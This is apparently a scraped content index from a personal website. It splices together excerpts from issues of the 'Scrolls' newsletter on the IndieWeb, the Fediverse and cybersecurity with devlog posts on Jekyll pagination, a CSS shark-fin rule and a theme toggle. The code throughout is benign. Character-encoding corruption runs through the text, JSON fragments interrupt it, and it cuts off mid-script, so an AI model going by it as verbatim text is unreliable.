
This week, there is a focus on the tectonic shifts of the web, as we claw back our independence from ‚Äúbig tech‚Äù. Plus, you see me try a little harder to add some narrative color to the Cybersecurity section of this newsletter. Let‚Äôs get scrollin‚Äô! IndieWebThere‚Äôs a lot of high-minded analysis about the web these days. It seems a tipping point has been reached. Blame it on enshittification, blame it on AI, blame it on the global rise of authoritarianism. Whatever the reason, a lot of words are being spilled in the name of the web as it should be, as it once was. These theses and essays have a commonality - we can make the web ours, we can take back the power, we can escape the walls of ‚Äúbig tech‚Äù, and in doing so, enter a new phase of the web, and of society. Because right now, a lot of the web just sucks‚Ä¶ Speaking of shit, I gotta agree with Max, Davey and Joan - let‚Äôs not give Substack any more air. Urge the creators you like who are there to set up shop elsewhere, and don‚Äôt give them (Substack) any of your own time or content. You‚Äôre better off building almost anywhere else. It‚Äôs never been easier too! The resources available to you for learning, building, publishing, navigating whatever you need to do on the web, are bountiful. You can absolutely do it yourself. Once you‚Äôve got that stake in the ground, the world can really open up for you. There‚Äôs so much you can do, so many ways to express yourself and have fun with a personal website. ask DNA published a /stuff (similar to /uses) page describing some of the the tech they use, Beej added Mastodon comments to his blog, I published my site‚Äôs guiding principles, David wrote about the things people commonly have, but he doesn‚Äôt and Joel just wrote about goin‚Äô outside and chillin‚Äô. You can do, or not do, anything you want with your site! Though just a heads-up, if you don‚Äôt add an RSS feed to your blog, Chris might literally come to your house and generate that RSS feed for you üòÜ. Here‚Äôs some other cool gems (sites and blogs) I‚Äôve discovered from across the IndieWeb! ≈Ωan ƒåerne Sainthood. xyz The Natural System of Colours from Nicholas Rougeux A Portfolio from Andr√©s theresmiling. eu from ElenaNow, time for my link dump of link dumps.

FediverseA lighter week for Fedi-fare, but there‚Äôs a couple of things to listen to if you‚Äôre game for some podcastin‚Äô‚Ä¶ Mike McCue‚Äôs Dot Social podcast published their latest episode with ‚ÄúFediverse Enthusiast‚Äù Chris Trottier Matthias Pfefferle published the first in a series related to the Fediverse, of his Open Web Conversations podcast, titled ‚ÄúDecentralized Social Networks &amp; WordPress with Alex Kirk‚Äù CybersecurityNow, let‚Äôs get the cyber flowin‚Äô! What do we think 2025 has in store for us in the world infosec? If you guessed more risk, more vulnerabilities and more security failures, then you nailed it! But, we soldier on. Since ‚Äúvulns‚Äù are a topic (aren‚Äôt they always?), let‚Äôs consider the ways to assess, and ultimately eradicate entire vulnerability classes. This research from the NCSC attempts to distinguish vulns as either ‚Äúforgivable‚Äù or ‚Äúunforgivable‚Äù, assigning the latter to vulns with ‚Äúeasy‚Äù mitigations. A little root cause analysis and pressure on the vendors and voila! Some security gainz, perhaps? Turning our attention to more recent vuln-news though, this week I‚Äôm checking out Hackaday‚Äôs ‚ÄúThis Week In Security‚Äù link dump and the always jam-packed AppSec EZine.

This week, we conquer doubt, recognize the primacy of the Fediverse, and look at some super-duper-serious cyber stuff. Before getting into this week‚Äôs ever-so-magical bits &amp; bytes, I wanted to quickly chat about how I source the content for this publication. Unsurprisingly, it‚Äôs from the respective IndieWeb, Fediverse &amp; Cybersecurity communities. More specifically though, I find a lot by following the #indieweb hashtag on the Fediverse, through my existing RSS feed that I‚Äôve curated over many years, and from all my awesome follows on Fedi‚Äîa lot of whom are in the infosec industry. So what‚Äôs the best way to consume Scrolls? Scroll, open a lot of links, read, and then scroll some more! The magic comes from y‚Äôall, I just put it together. üòÑ Here‚Äôs you, readying yourself for the scrolling ahead! üì¢ Shoutout to my good friend, and SUPER talented artist angryrolypoly for whipping up the new Scrolls logo! ü§ó Also, I want to thank Kevin for creating some other scrolls art that I‚Äôve also used at the bottom of this edition! IndieWebThe best time to get started with a personal website was in 1995 üòÑ. The second best time is today! Your home on the web will undoubtedly have humble beginnings, but over time it can grow into something you can be incredibly proud of. There‚Äôs really so many resources available to you to get started, or start over‚Äîthere‚Äôs really no excuse to not take the plunge! For many, the reason why they don‚Äôt (create a personal website or blog), is doubt. But as I‚Äôve said before, having a website doesn‚Äôt need to be about blogging, and honestly, regardless of what you write, I know you will have an audience. So be yourself, just write‚Äîmake it personal if you want, it doesn‚Äôt need to be perfect. Write about literally whatever you want, write about anything you do, hell, write about the things you don‚Äôt do. Manuel (for example) writes about things others are doin‚Äô. That‚Äôs cool! (Whatever you do though, don‚Äôt use AI slop images) Good question! Here‚Äôs some more stuff you can do with your site once you‚Äôve got it goin‚Äô. The IndieWeb is a near-infinite wellspring of opportunities and ideas waiting to take root. Try participating in the monthly IndieWeb Carnival, publish your favorite pictures, improve your site‚Äôs accessibility capabilities or just tinker around and make other little upgrades. You could even see what your site would look like sans-CSS. Some would say that‚Äôs the ideal form of a website. üòÜ Here‚Äôs some of my favorite personal sites I‚Äôve stumbled across this past week‚Ä¶ moonlight computer Nick Simson Ana Rodrigues nelsons. website Je Sian Keith Herman Nicolas Hoizey Renkon Sylvester Ady Pretty Good Hat | Weeknotes and Joel‚Äôs Week NotesFediverseThe Fediverse is now‚Äîwe need only seize the opportunity to truly own our digital identities, build sustainable+healthy communities, and abandon the traditional corporate data silos and algorithmic dictators of this modern dystopic epoch. The Fedi‚Äô is ready, so join today (if you haven‚Äôt already), and bring your friends! Maybe the Fediverse hasn‚Äôt reached any sort of adoption tipping point yet, and that‚Äôs too bad. But it hasn‚Äôt stopped the gears from turning here. There always seems to be a lot of building and innovating regardless. We‚Äôll be ready if and when the time comes‚Äîto accept the masses, and show them the way. PeerTube is your go-to, federated solution for hosting videos. GoToSocial continues to prove a worthy platform to migrate to if you‚Äôre having instance/Mastodon-platform issues. Mastodon keeps chugging along, publishing their Feburary 2025 engineering update. (Oh and this is pretty exciting on the Mastodon front too) Ghost continues their quest to fully implement ActivityPub within their platform. Seppo is a new idea in the federated, single-user, microblog space. Platforms abound, but there‚Äôs even more to do and discover on the Fediverse! Find (or build) cool bots or make a FediCard!

This week we work on our selves sites, consider how we want to use social media, and learn to hunt for dead bodies (of code). Scrolls is as much a place for me to highlight cool content as it is a vehicle for me to boost and spotlight the actual people from these vibrant communites. That‚Äôs the thing about the IndieWeb, and about the Fediverse‚Äîit‚Äôs not about raw numbers, it‚Äôs not about being a content creator, it‚Äôs not about followers. It‚Äôs about being yourself, an actual person, and building actual relationships, as you would in real life. When you see it through that lens, you start to appreciate the handful of meaningful interactions you have here more than finding some engagement maxima on other platforms. Scrolls is my personal way of saying, ‚Äúhey, I saw this thing you posted, I read it, and I liked it enough that I wanted to write about it or share it out from my site. ‚Äù It is as much a direct message to those individuals as it is a broadcast to everyone who has subscribed or otherwise reads this publication. I hope this motivates you to write, share and connect‚Äîin this same organic, neighborly way! IndieWebHello, IndieWeb folks! How is your site comin‚Äô along these days? (If you‚Äôve had the time to get one goin‚Äô. ) Don‚Äôt worry if it isn‚Äôt finished, it‚Äôs never supposed to be! Your indie site is afterall, a reflection of your self‚Äîincomplete, imperfect and forever under construction. Don‚Äôt sweat the ‚Äúbig‚Äù things you think you need to add to the site, it just needs to be a fun place for you to share yourself, and the other things you find that you like. Remember, it‚Äôs just a fu**ing site. üòÑ Looking for more motivation on why you should join the IndieWeb? Well, if escaping any of THESE ‚¨áÔ∏è isn‚Äôt reason enough for ya‚Ä¶ ‚Ä¶consider the following reason. Maybe you just have stuff to say, and want to say it in a place that fits your creative vibe (like skippy has done!). The only way you can fail, is to not try‚Äîand don‚Äôt worry, you won‚Äôt be alone out here! You‚Äôll join the likes of Caleb, Steven, Isa and one of my long-time favorites, Flamed‚Äîas well as countless others. Be a part of the movement! Here‚Äôs some wisdom I‚Äôve collected recently from the IndieWeb community on making your blog likable (and thus becoming a mainstay in someone‚Äôs RSS reader) and how to make your site accessible for those looking to learn and follow in your footsteps. Once you have a nice li‚Äôl home for yourself on the web, maybe you can open it up and adopt a li‚Äôl creature too! Here‚Äôs my lovable new addition to the Shellsharks family. ‚¨áÔ∏è FediverseMuch like the IndieWeb, the Fediverse is a place to be yourself. But getting the most out of it as a social network, specifically one where you mean to actually be social, and not one you use solely as a megaphone, isn‚Äôt necessarily simple. You have to make concious, explicit decisions about how you plan to use the platform(s). The Fediverse is uniquely, un-algorithmic in nature (at least in the traditional sense), and thus requires manual care to tune the feeds and respective clients to your liking. It‚Äôs this from-scratch, build-your-experience model that enables the Fediverse to be a place that is non-extractive‚Äîsomewhere you actually enjoy to be because you aren‚Äôt there to necessarily sell yourself, or be sold to. Unlike the centralized social platforms, the Fediverse has an insanely vibrant assortment of platforms, clients, initiatives and connected services. Just in this past week I discovered a ton of interesting projects‚ÄîBetula is a tool for saving bookmarks or maintaining a linklog, ForgeFed is a federation protocol for software forges / code collaboration tools, BadgeFed empowers communities to issue and verify badges, Myo is a photo-centric app compatible with the Fediverse and Bluesky / Nostr, Tumblr plans on joining the Fediverse soon, Ghost has just connected to the Fediverse, Fedivents is a gateway to the world of Federated Community Events and there‚Äôs so many other li‚Äôl apps of the Fediverse out there to discover, with more breaking ground every week. If you‚Äôre interested you can even track/search all Fediverse Enhacement Proposals (FEPs) using this handy-dandy search tool!

This week we go old-school with webrings, emphasize the importance of the Fediverse, and see ghosts in the machine. No time to waste‚Äîlet‚Äôs vibe and scroll! üé∂ IndieWebBlogging is a journey of learning and self-discovery. To get the most out of your blog, and your presence as part of the IndieWeb, you must continuously find ways to fuel that creative fire‚Äîto be motivated, to write, and to express yourself. At times, this will mean fighting impostor syndrome, combatting laziness/fatigue, overcoming writers block or just worrying about outdated content on your site. In my experience, you overcome these obstacles with a steady dose of learning (e. g. learn more about HTML and CSS) &amp; inspiration. These tend to get the creative juices, and stream-of-ideas, a-flowin‚Äô. Honestly though, the provenance of most of my best ideas comes not from within, but rather from all of you‚Äîthe larger IndieWeb community. The wellspring of creativity that can be tapped into is positively endless, you need only take the time to discover even a handful of other awesome sites, blogs &amp; web-gardens out there to start benefiting. Webrings are a classic, old-web-style take on discovering new sites and also socializing / networking with like-minded folks. I‚Äôve been cataloguing interesting Webrings I‚Äôve encountered here, brisray has a huge list here and sadgrl has yet another list here! Take some time to peruse these rings for sites you think are cool, and maybe even join a webring or two‚Äîor more! But there‚Äôs more IndieWeb-related social constructs to consider‚Ä¶ Robert published a post on how RSS blogrolls could be used as a federated social network (an idea that Reilly has taken off with) and Hyde has a series in which he features other IndieBloggers from across the net. The common trait amongst these things (i. e. webrings, blogrolls, etc‚Ä¶) is that they are uniquely non-algorithmic (in the common sense). These are home-grown curations‚Äîhuman in the best of ways. and Remember! Use some form of web/RSS reader to follow everything you find and like! For example, here‚Äôs some awesome sites I‚Äôve discovered recently!‚Ä¶ IndieBlogs: Lost Letters from lost Caffeine &amp; Lasers by Cameron chupson. dev by chupson ellesho. me by elle vinizinho. net by vinizinho(Also, booooooooo AI crawlers and Substack ü§ñü§Æ) FediverseYou should care about the Fediverse. This is doubly true if you care about the IndieWeb. Triply true if you value an open web. The fact is, social media is big business‚Äîthis is because it is important. The Fediverse may not be ‚Äúbig business‚Äù in the traditional sense, but this is why it is that much more of a big deal. It is an opportunity to do social media in an ethical, open, sustainable, trustworthy and truly human way. Spring has sprung on the Social Web! So let‚Äôs crawl out of our physical and metaphysical holes we‚Äôve been hiding away in and get out there and get social! This could be as easy as embedding Mastodon posts on your IndieWeb site, or maybe you could actually meet people in real life, or it could be just finding your particular social niche‚Äîlike in music or imagery! Afterall, the Fediverse has just about everything.

This week, we kick write-it old-school, see what‚Äôs buzzin‚Äô across the Fediverse, get into some neat cyber-frameworks, and a whole lot more! Ten issues into this publication, I wanted take a minute to reflect on how I think this has been goin‚Äô, what‚Äôs ‚Äúworked‚Äù, how I am using the newsletter and what‚Äôs in store for the future of Scrolls. Overall, I‚Äôm very happy with the reception of Scrolls and believe it has been successful in bringing cool stuff that I discover each week to a lot of people who would have not otherwise seen said stuff. This was always goal number 1. I think chunking each edition into three primary sections (i. e. IndieWeb, Fediverse, Cybersecurity) has mostly worked, but I‚Äôm admittedly having a harder time piecing together a useful ‚Äústory‚Äù when it comes to the cybersecurity section in particular. I plan to keep it around, because the secondary goal of this newsletter is to really be a reference for myself, and I find myself searching through past issues a lot for things I had saved. Two things I‚Äôve been doing since the beginning that I‚Äôve really enjoyed are featuring artists and their artwork, and taking the time to credit all the individuals who helped me source content for that week‚Äôs edition. The art makes the newsletter more visually interesting, and shouting out folks from across these communities helps with reach, helps boost cool creators and is just a nice community-oriented way to further engage. So what about the future of Scrolls? Well, topics are somewhat cyclical, but content seems as evergreen as always, so I don‚Äôt really see myself ‚Äúrunning out of things to talk about‚Äù and/or share. As an idea for the future, it might be cool to further emphasize creators through guest-posts / featurettes. If you‚Äôve got any ideas, or have something you‚Äôd like to be featured or linked-to, always feel free to let me know! Time to pore over this week‚Äôs awesome issue! IndieWebThe oft-misunderstood beauty of the IndieWeb, the ‚Äúpersonal‚Äù web, is that it is a medium in which, in my opinion, perfectly blends the capacity to socialize at human-scale, with the ability to comfortably, and more meaningfully, express yourself. Modern social media is no doubt a technological wonder, but it is also relentless inundation. Humans are social creatures, but not THAT social. Connecting with 100‚Äôs or 1000‚Äôs of people‚Äîactually connecting with them, is an exercise an exhausting futility. Socially, we operate at community-scale and the IndieWeb does a much better job facilitating that. Here on the IndieWeb, we forgo the judgement of the masses and are free to just write, publish our crap, and y‚Äôknow‚Ä¶ just be ourselves‚Äîas it once was. They say, everything old is new again‚Äîand this holds true for the web. These web-relics of a bygone era are staging a real comeback. We got webrings (e. g. a11y-webring. club), buttons and blogrolls galore! What these bring is that imperfect (human) creativity and community-like socialization back to the modern, uniform, sterile web. The web used to be fun, and that‚Äôs because the web used to be us. Yeah, it wasn‚Äôt what Facebook thought we should be, or Instagram, or Linkedin, or any of these other platforms. This made the web an adventure, a garden of creativity, and a place of wonderment. Ready to plant your seed for a future Internet which embodies these ideals? When people come to your site, what do you want them to see? How do you want them to feel? How do you think it should smell? Create a space that expresses who you really are. (You might want to learn a bit about CSS to make that happen üòÑ). Make the web fun again, make the web us again. Thinking of where to plant your little Internet seed? You could consider sourcehut, Codeberg or Ghost (among others)! But be careful out there, those scrapers are relentless. With any luck, time will bring a mass decentralization, a true re-wilding of the web. If and when that happens, we‚Äôll need to rely on each other once more to fuel meaningful and digestible discovery. Tools like BlogFlock and Flithos could maybe help!

When I was building the Activity log page recently, I was looking for ways to pull in content from around the site to feature in that timeline. I already had posts, notes and logs in their respective collections but changes and podcasts existed in singular page files, making it more difficult to pull individual records out without using some wacky JS/jQuery. It was then I had the idea to convert these monolithic pages, breaking them out into more atomic collection items. So that‚Äôs what I did! For changes, I‚Äôve decided to go with a ‚Äúchange collection item‚Äù being 1 week in length, with a file for each week. For podcasts, each podcast has its own record file and for now those files simply redirect to the Podbean permalink page where it is hosted. But! since I have the full-text shownotes in each file, I can programmatically loop through each podcast collection item and populate the main Podcast page with a bulleted list of show descriptions, much like I‚Äôve always had, but now it is no longer statically typed. Woo! Similarly for changes, the Changelog still has some legacy changes listed in monolithic format (i. e. a gigantic list of bulleted sections), but for all changes in 2024+, they are programatically pulled in from the changes collection and populated much the same way they‚Äôve always been right inside the main Changelog page. Nice! My takeaway here is to consider in the future (and now looking back) what repeated/similar content would make sense to exist as a collection rather than a single, giant file. I haven‚Äôt pored through everything in my site to see if there‚Äôs any worthy candidates for additional conversion yet but eventually I will. Collections give you the ability to do multiple things with the same set of data. As I‚Äôve seen with both changes &amp; podcasts, I can now populate both their landing pages as well as the Activity feed with minimal additional effort. " }, { "id": 433, "url": "https://shellsharks.com/devlog/pagination-nation", "title": "Pagination Nation", "body": "2025/01/29 - In the last Devlog, I talked about Jekyll collections and how I‚Äôm using them. As your site grows older, and you write more and more things, across a variety of collections, your pages which list-out content become more and more unwieldy, thus necessitating things like pagination. I encountered this issue some time ago - notably, with my Notebook, Changelog &amp; Activity pages, each having 100‚Äôs of entries respectively. When not paginated, this results in not only very long pages that require quite a bit of scrolling to navigate, but also yielded pages that were very ill-performant, especially on mobile. My iPhone would nearly freeze trying to load, render or navigate away from these huge pages. So how can I mitigate this? Pagination of course! Pagination is great, but unfortunately, if you are using GitHub Pages and building/deploying via the classic Deploy-from-a-branch method, you are limited to the legacy jekyll-paginate plugin, which can only paginate on a single page within your site, specifically on the root level index. html page. Ouch. Since I need the ability to paginate a variety of collections on multiple distinct pages, I needed something else - enter jekyll-paginate-v2. Jekyll-paginate-v2 seemed to satisfy my requirements, but unfortunately, vanilla GitHub Pages does not support many plugins, this being one of them. Honestly, at this point I flirted with the idea of re-writing my entire blog using something like 11ty. I still might do this one day, but really I just want my current site to work the way I want, without having to scrap it. So‚Ä¶ the other solution is changing the way I build &amp; deploy the site. Fortunately, GitHub gives you the option to switch from the classic Pages Deploy-from-a-branch method to one based on GitHub Actions. I‚Äôm not going to explain what Actions is, but in the context of this writeup, just know it lets me use the full suite of Jekyll plugins, not just the limited selection that GitHub Pages supports. Woo! Configuring GitHub Actions for GitHub Pages Build &amp; DeployAlright. So how can I switch from the classic build+deploy method to the Actions-based one? Jekyll actually has a doc for exactly this. The steps as written are very simple and very straight-forward, or so I thought‚Ä¶ After creating the new action, Pages tried to build my site but quickly ran into an error with the Ruby setup. The traceback ended as follows‚Ä¶ In Gemfile: github-pages was resolved to 209, which depends on jekyll-mentions was resolved to 1. 6. 0, which depends on html-pipeline was resolved to 2. 14. 0, which depends on nokogiriError: The process '/opt/hostedtoolcache/Ruby/3. 1. 6/x64/bin/bundle' failed with exit code 5I‚Äôll admit, I was pretty stumped at first, and didn‚Äôt really know how to troubleshoot. You see, even though I‚Äôve been running this Jekyll site for over 5 years, I really haven‚Äôt learned much about Ruby, hah! Looks like that needed to change, so I persist. After browsing around, I started to home in on the root problem - it seemed like I had some dependency issues stemming from my Gemfile. lock and/or Gemfile files. Ok, nice! Let‚Äôs add Gemfile. lock to my . gitignore and then swap out gem 'github-pages' to gem jekyll , ~&gt; 4. 2 in my Gemfile. Commit the repo and then about a minute later, a green check in my workflow record! It worked! Configuring Jekyll-Paginate-V2OK, now that my site can successfully be built &amp; deployed via GitHub Actions, I need to get the jekyll-paginate-v2 plugin enabled and setup. Ultimately, it‚Äôs pretty simple to get set up and surprisingly backwards-compatible (with the classic jekyll-paginate plugin), but there‚Äôs a few bugs and other little tidbits to know so you don‚Äôt pull your hair out‚Ä¶ Caching BugThe most insidious bug with getting the Jekyll-Paginate-V2 plugin to work is the ‚Äúcaching bug‚Äù. This is described here - Resolve the Jekyll Paginate V2 Caching Bug. To fix, go to your Gemfile and replace gem 'jekyll-paginate-v2' to either‚Ä¶ gem 'jekyll-paginate-v2', git: 'https://github. com/mohkale/jekyll-paginate-v2. git', branch: 'liquid-cache-bypass' or gem 'jekyll-paginate-v2', git: 'https://github. com/jameshi16/jekyll-paginate-v2. git', branch: 'cache-mismatch-error' Fixed! Set indexpage &amp; extension to nilThe second (much more minor) issue I encountered was with how the plugin wants to tack on ‚Äòindex. html‚Äô as the default name for generated pages. This causes weird, often just unsightly issues with how the page urls look for paginated pages. You‚Äôll get pages that look like ‚Äòhttps://domain/paginatedpage/page/3/index. html‚Äô, instead of the cleaner ‚Äòhttps://domain/paginatedpage/page/3‚Äô. You can fix this by going into your config. yml file and making sure indexpage and extension are set to nil (as shown below). # Optional, the default file extension for generated pages (e. g html, json, xml). # Internally this is set to html by default extension: # Optional, the default name of the index file for generated pages (e. g. 'index. html') # Without file extension indexpage: Understanding the V2 Pagination GeneratorThe last consideration is less of a bug and more of just a need-to-know. From v1 to v2 pagination links and paginator object variables/methods are largely the same, so much of any existing pagination code/syntax you may have from using the classic jekyll-paginate plugin should continue to work. To enable pagination on other pages, specify the collection you want to load in via the pages front matter, and continue to use the paginator. posts directive (even though you might be using a non-‚Äòpost‚Äô collection). Here‚Äôs more information on the v2 Pagination Generator. So at the end of the day, I figured it out! As a result, I‚Äôve been able to paginate my Notes, my Activity page and my Changelog, while keeping my main page pagination of my blog posts the same. From here, I still want to add pagination for a few other, less-pressing pages, i. e. the Captain‚Äôs Log, Podcasts, Tags, Devlog and more! AppendixPagination Links CodeIf you want to replicate my paginator trail, the code I use for the links is provided below. &lt;!-- Pagination links --&gt; {% if paginator. page_trail %} &lt;ul class= pagination pagination-sm style= display: flex; justify-content:center; &gt; {% if paginator. previous_page %} &lt;li&gt;&lt;a href= {{ paginator. previous_page_path | prepend: site. baseurl | replace: '//', '/' }} &gt;&amp;laquo;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href= /YOURPAGEHERE &gt;&amp;nbsp;First&lt;/a&gt;&lt;/li&gt;&amp;nbsp;&amp;nbsp; {% else %} &lt;li class= disabled &gt;&lt;span aria-hidden= true &gt;&amp;laquo;&lt;/span&gt;&lt;/li&gt; &lt;li class= disabled &gt;&lt;span aria-hidden= true &gt;&amp;nbsp;First&lt;/span&gt;&lt;/li&gt;&amp;nbsp;&amp;nbsp; {% endif %} {% for trail in paginator. page_trail %} &lt;li&gt; {% if paginator. page == trail. num %} {{ trail. num }} {% else %} {% if trail. num == 1 %} &lt;a href= /YOURPAGEHERE &gt;{{ trail. num }}&lt;/a&gt; {% else %} &lt;a href= /YOURPAGEHERE/page/{{trail. num}} title= {{trail. title}} &gt;{{ trail. num }}&lt;/a&gt; {% endif %} {% endif %} &lt;/li&gt; &amp;nbsp;&amp;nbsp; {% endfor %} {% if paginator. next_page %} &lt;li&gt;&lt;a href= /YOURPAGEHEREy/page/{{ paginator. total_pages }}/ &gt;Last ({{paginator. last_page}})&amp;nbsp;&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href= {{ paginator. next_page_path | prepend: site. baseurl | replace: '//', '/' }} &gt;&amp;raquo;&lt;/a&gt;&lt;/li&gt; {% else %} &lt;li class= disabled &gt;&lt;span aria-hidden= true &gt;Last&amp;nbsp;&lt;/span&gt;&lt;/li&gt; &lt;li class= disabled &gt;&lt;span aria-hidden= true &gt;&amp;raquo;&lt;/span&gt;&lt;/li&gt; {% endif %} &lt;/ul&gt; {% endif %}" }, { "id": 434, "url": "https://shellsharks.com/devlog/shark-fin-hr", "title": "Shark Fin &lt;hr&gt;", "body": "2025/02/20 - You may have noticed that I have a bit of a shark theme goin‚Äô on across the site. It‚Äôs not overwhelmingly shark-ey, but there‚Äôs certainly a shark or two sprinkled about - and I think that‚Äôs just fun. To this end, I had another fun li‚Äôl idea. What if I could change the usual boring ‚Äòol &lt;hr&gt; tag (horizontal rule) and have a shark dorsal fin coming out of it? Sounds cool right? Right. I had this idea months or even years ago, I filed it away for another day, thinking it too hard for me to accomplish myself. It would have to be something that I‚Äôd need to learn a lot of arcane HTML/CSS to do or maybe I‚Äôd just need to hire someone to make it for me. Yesterday, for whatever reason, I decided to try and take it on. I‚Äôm going to walk through a bit of my trial and error, and then get into how I finally pulled it off. Trial and Error: Let me tell you, getting this to work probably took me 4-5 hours of just sittin‚Äô in my chair, hammering away. Though I can safely say I mostly figured out everything to get it to work, I also can say I figured out lots of ways it doesn‚Äôt work. The way I thought this would work originally, and thus the way I approached it at first, was to use HTML‚Äôs Canvas Graphics to draw a shark fin and a line, and just use that instead of the normal &lt;hr&gt; tags. Of course I know nothing about drawing with &lt;canvas&gt;, and I absolutely wasn‚Äôt going to try and learn it well enough to do it myself, so naturally I googled for an answer. It wasn‚Äôt long into this search that I realized maybe drawing with straight CSS would be a better option. So, I searched for that instead. Google came up pretty dry once again, but there was one potential splash of luck. 1 Alvaro had managed to draw a (adorably cute) shark entirely with HTML and CSS. Cool! But could I use it somehow? I cmd+C &amp; cmd+V‚Äôed the code and tried ripping out stuff to get to just the fin. I figured if I could isolate the fin, I could tweak it a bit to be what I wanted. I was wrong. I gave up on that after like 10 min. So now what? I got a bit desperate, from there I tried‚Ä¶ Searching for web tools that would convert drawings to CSS code Searching for vector libraries I even used ChatGPT to try and make it (here‚Äôs what it came up with - sorry I can‚Äôt get the viewBox to behave) Fresh off of humiliating myself by thinking AI could be useful, I came across some actually useful info. Basically, I learned that I could customize &lt;hr&gt; tags with a character, or image using the ::after pseudo-element. 2 Neat!. This seemed like a more elegant solution. I could still use &lt;hr&gt; tags, just with a class specifier rather than importing some janky inline-svg + html + css abomination each time I wanted the effect. So, like any seasoned developer, I borrowed the code from the stack overflow page and started tweaking from there. But then I ran into my next issue, I needed an image to import! And not just any image, I needed something I could move along the &lt;hr&gt; continuum, something I could size up and down, and something I could change the color of. First place I went to was . svg. I spent some time googling around for shark fin . svgs and came across a number of things that would work for me. The xml syntax within an SVG file is kinda strange, and it took me a while to grok, but eventually I figured out how to change the fill color, resize it to my liking and generate a mirror image so that the shark fin can point both left and right. So, let me give you the final result‚Ä¶ Shark Fin &lt;hr&gt;: Here‚Äôs how I finally put together my current v1. 0 Shark Fin &lt;hr&gt; Within the SVG, you can resize by changing the ‚Äòwidth‚Äô property in the &lt;svg&gt; tag. You can change the fill color with the ‚Äòfill‚Äô property in the &lt;path&gt; tag. Finally, for mirroring the image across the Y-axis, you can add transform= scale (-1, 1) transform-origin= center to the &lt;path&gt; tag as well (as shown below). I also had to toy around with the viewBox to take out unneccessary white-space/padding. &lt;svg . . . width= 35px viewBox= 0 0 1000 1000 . . . &gt; &lt;path fill= #CA3342 transform= scale (-1, 1) transform-origin= center . . . /&gt;&lt;/svg&gt;My CSS for the ‚Äòfin‚Äô class‚Ä¶ :root { --hrfin-position: 40%; --hrfin-content: url( '/assets/img/shark-fin-notch. svg' );}hr. fin { margin-top: 40px; /* compensating for height of the fin */ margin-bottom: 40px; /* making the bottom margin the same as the top */ border-top: 1px solid var(--accent-color); /* the color that I want the hr tag to be */ border-bottom: 1px solid var(--accent-color);}hr. fin:after { content: var(--hrfin-content); /* Loading the SVG url from :root */ left: var(--hrfin-position); /* Setting the position of the fin along the rule */ position: relative; bottom:29px; /* Moves the fin closer to the line - it's 6px less than the svg width */}So why am I setting the ‚Äòleft‚Äô position and loading the svg from :root instead of directly? Well that‚Äôs because I wanted to randomize the fin‚Äôs position along the rule on page load. So I have some JavaScript that does this. const root = document. querySelector( :root ); //grabbing the root elementvar rand = Math. floor(Math. random() * 90) + 1;const fins = [ url( '/assets/img/shark-fin-notch. svg' ) , url( '/assets/img/shark-fin-notch-reverse. svg' ) ]var fins_rand = Math. round(Math. random());console. log(fins[fins_rand]);root. style. setProperty( --hrfin-position , rand + % );root. style. setProperty( --hrfin-content , fins[fins_rand]);So what do I get in the end? This! *cue the music* OK, this rules. Try reloading the page a few times and see it change positions and directionality. Niiiiice! What‚Äôs cool too is that even if I shorten the width of the rule, the shark will stay along it. You can now call me the Poseidon (or Aquaman) of HTML, as I summon forth a shiver of &lt;hr&gt; sharks! Future Improvements: But things aren‚Äôt exactly how I‚Äôd like to see them. There are some improvements to be made in future iterations. A wish list of things I‚Äôd like to see it do in the future‚Ä¶ Given the way I am loading the SVG, I can‚Äôt dynamically change the color of the fin, it is statically set in the SVG itself. I‚Äôm fine with the compromise for now but would like to address this later. The fin position (X-axis), set by the CSS ‚Äòleft‚Äô directive is the same for all fin-class hrs on the page. Notice how all of them on this page are at the same point on the line. It‚Äôd be cool to randomize the position for each instance of the rule on a single page. I‚Äôm pretty happy with the shark fin SVG I‚Äôve landed on (Thanks Creative Fabrica!), but could see myself getting something a bit more customized in the future. If I wanted to get crazy, maybe I‚Äôd have the fins animate in some way, like an actual shark swimmin‚Äô around the rules. Another compromise was having to use JavaScript to randomize the svg file and position. Modern/supported versions of CSS don‚Äôt have any way to produce a random value. There are some hacky ways to achieve this, but I couldn‚Äôt figure them out. It‚Äôd be cool to have this not be . js-dependent in the future. Suggested to me was the idea to have the ‚Äòleft‚Äô position determined by scroll position, so the shark would look like it was swimming as one scrolled. Interesting idea!

Theme Toggle: I prefer a dark theme, but not necessarily the super-contrasty dark mode that you sometimes see. Others may prefer that, or maybe they‚Äôre a sicko light-mode type of person. Y‚Äôknow I try not to judge. WIth this in mind, I wanted to create a theme toggle switcher that could iterate over three distinct themes. In my case, dark, light, and classic. The ‚Äúclassic‚Äù theme is basically the (dark-mode-ish) color scheme that my site has been rocking since ~2021. You can see the current color palettes for each theme on my Style page. So, how did I achieve the 3-mode theme switcher? It took some googlin‚Äô around, and sifting through a lot of results that were for 2-mode implementations, which seemed to always employ a hidden HTML check box, but I eventually found my solution. A sanitized (I took the colors out, you can look at them on my Style page) version of my CSS code relevant to the theme switcher toggle is below. :root { --accent-color: #CA3342; /* OTHER COLORS */}/* themes */[data-theme= dark ] { --accent-color: #FA7575; /* OTHER COLORS */}[data-theme= light ] { --accent-color: #96000f; /* OTHER COLORS */}[data-theme= classic ] { --accent-color: #FA7575; /* OTHER COLORS */}Then, there‚Äôs some JavaScript code which does the switching when you press the Toggle theme button (located in the Hamburger menu). function switchTheme(e) { if (document. documentElement. getAttribute('data-theme') == 'dark') { document. documentElement. setAttribute('data-theme', 'light'); localStorage. setItem('theme', 'light'); document. getElementById('themetoggle'). setAttribute( class , ph ph-moon ); } else if (document. documentElement. getAttribute('data-theme') == 'light') { document. documentElement. setAttribute('data-theme', 'classic'); localStorage. setItem('theme', 'classic'); document. getElementById('themetoggle'). setAttribute( class , ph-fill ph-moon ); } else if (document. documentElement. getAttribute('data-theme') == 'classic') { document. documentElement. setAttribute('data-theme', 'dark'); localStorage. setItem('theme', 'dark'); document. getElementById('themetoggle'). setAttribute( class , ph ph-sun ); } else { document. documentElement. setAttribute('data-theme', 'dark'); localStorage. setItem('theme', 'dark'); document. getElementById('themetoggle'). setAttribute( class , ph ph-sun ); } }toggleSwitch. addEventListener('click', switchTheme, false);The final piece of this theme-switching puzzle is the code below which resides on each page. I‚Äôve added it to the default. html layout in the ‚Äò_layouts‚Äô directory of my Jekyll site. Basically, it gets and sets the theme in a browsers localStorage. It also uses the prefers-color-scheme directive to take advantage of users preferred dark vs light mode setting on their device(s). Cool! &lt;script&gt; const currentThemeX = localStorage. getItem('theme') ? localStorage. getItem('theme') : null; if 